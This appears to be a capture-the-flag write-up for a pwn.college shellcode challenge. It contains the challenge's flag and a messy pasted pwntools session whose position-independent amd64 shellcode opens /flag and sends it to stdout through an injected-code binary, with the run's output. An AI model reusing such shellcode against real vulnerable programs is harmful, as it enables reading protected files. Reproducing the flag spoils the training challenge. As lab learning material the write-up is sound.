# Basic Shellcode
in thus challenge we lean about the baic shell scripting about system call and about 2 that we write to open the file

## Flag
pwn.college{Aa4dEJod_bOqTOrk8W__2zzALds.01NxIDL5gDN1czW}

## Solve
```bash
from pwn import *

In [2]: context.arch='amd64'

In [3]: shellcode=asm('
  Cell In[3], line 1
    shellcode=asm('
                  ^
SyntaxError: unterminated string literal (detected at line 1)


   ...:    ...:     /* open("/flag", O_RDONLY) */
   ...:    ...:     mov rax, 2                    
   ...:    ...:     lea rdi, [rip+flag]           
   ...:    ...:     xor rsi, rsi                  
   ...:    ...:     xor rdx, rdx                  
   ...:    ...:     syscall
   ...:    ...:
   ...:    ...:     /* sendfile */
   ...:    ...:     mov rdi, 1                    
   ...:    ...:     mov rsi, rax                  /* fd from open */
   ...:    ...:     xor rdx, rdx                  
   ...:    ...:     mov r10, 0x1000               
   ...:    ...:     mov rax, 40                   /* sys_sendfile instruction */
      â‹® 
   ...:    ...:     syscall
   ...:    ...:
   ...:    ...:
   ...:    ...: flag:
   ...:    ...:     .string "/flag"
   ...:    ...: ''')
   ...:    ...:
   ...:    ...: p = process('./binary-exploitation-basic-shellcode')
   ...:    ...: p.send(shellcode)
   ...:    ...: print(p.recvall())
[x] Starting local process './binary-exploitation-basic-shellcode'
[+] Starting local process './binary-exploitation-basic-shellcode': pid 177
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 302B
[x] Receiving all data: 532B
[x] Receiving all data: 884B
[x] Receiving all data: 1.39KB
[x] Receiving all data: 2.00KB
[*] Process './binary-exploitation-basic-shellcode' stopped with exit code -4 (SIGILL) (pid 177)
[+] Receiving all data: Done (2.00KB)
b'###\n### Welcome to ./binary-exploitation-basic-shellcode!\n###\n\nThis challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them\nas code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will\npractice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing\nother tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n\nIn this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every\nexecution, your shellcode will need to be *position-independent*.\n\nAllocated 0x1000 bytes for shellcode on the stack at 0x7fff60f4f5a0!\nReading 0x1000 bytes from stdin.\n\nThis challenge is about to execute the following shellcode:\n\n      Address      |                      Bytes                    |          Instructions\n------------------------------------------------------------------------------------------\n0x00007fff60f4f5a0 | 48 c7 c0 02 00 00 00                          | mov rax, 2\n0x00007fff60f4f5a7 | 48 8d 3d 25 00 00 00                          | lea rdi, [rip + 0x25]\n0x00007fff60f4f5ae | 48 31 f6                                      | xor rsi, rsi\n0x00007fff60f4f5b1 | 48 31 d2                                      | xor rdx, rdx\n0x00007fff60f4f5b4 | 0f 05                                         | syscall \n0x00007fff60f4f5b6 | 48 c7 c7 01 00 00 00                          | mov rdi, 1\n0x00007fff60f4f5bd | 48 89 c6                                      | mov rsi, rax\n0x00007fff60f4f5c0 | 48 31 d2                                      | xor rdx, rdx\n0x00007fff60f4f5c3 | 49 c7 c2 00 10 00 00                          | mov r10, 0x1000\n0x00007fff60f4f5ca | 48 c7 c0 28 00 00 00                          | mov rax, 0x28\n0x00007fff60f4f5d1 | 0f 05                                         | syscall \n\nExecuting shellcode!\n\npwn.college{Aa4dEJod_bOqTOrk8W__2zzALds.01NxIDL5gDN1czW}\n'


```


the value of the number of bytes to be sent is given in the binary file. after that we write a asm code hich i used help of internet to arrive at. we use 2 to open the file and we call syscall for system call abd then we wriet 1 to sent the file and syscall again sends the instruction to the system. lea is putting int the register the starting rip instruction with the flag address. asm is the wawy to convert to assembly.
